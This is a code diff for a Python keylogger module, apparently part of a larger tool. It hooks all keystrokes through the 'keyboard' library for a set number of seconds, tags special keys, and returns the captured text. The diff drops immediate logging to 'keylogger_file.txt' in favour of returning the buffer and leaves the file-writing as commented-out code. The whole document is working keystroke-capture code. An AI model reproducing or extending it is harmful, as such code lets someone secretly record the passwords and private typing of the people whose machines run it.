@@ -2,7 +2,6 @@ import keyboard
 from keyboard import KeyboardEvent
 import time
 
-
 spec_key = {
     key: f'⌠{key}⌡'
     for key in [
@@ -32,34 +31,39 @@ def __parse_key_event(event: KeyboardEvent):
     if res in spec_key:
         res = spec_key[res]
 
-    print(res)
-    try:
-        with open('keylogger_file.txt', 'a') as f:
-            f.write(res)
-    except Exception as e:
-        print(f"Error to find file: {e}")
-
     return res
 
 
 def __key_log(duration):
     logger = []
 
-    keyboard.hook(
-        lambda event: logger.append(__parse_key_event(event))
-    )
+    def on_key_event(event):
+        key = __parse_key_event(event)
+        if key:
+            logger.append(key)
+
+    keyboard.hook(on_key_event)
 
     time.sleep(duration)
     keyboard.unhook_all()
 
+    return ''.join(logger)
 
-def get_key_log(duration=5):
+
+def get_key_log(duration):
     duration = int(duration)
 
     content = __key_log(duration)
 
+    # try:
+    #     with open('keylogger_file.txt', 'w') as f:
+    #         f.write(content)
+    # except Exception as e:
+    #     print(f"Error writing to file: {e}")
+
     return content
 
-
-if __name__ == '__main__':
-    print(get_key_log(5))
+# Example usage:
+# duration = 10  # Duration in seconds
+# key_logs = get_key_log(duration)
+# print(key_logs)  # Or use the key_logs variable as needed
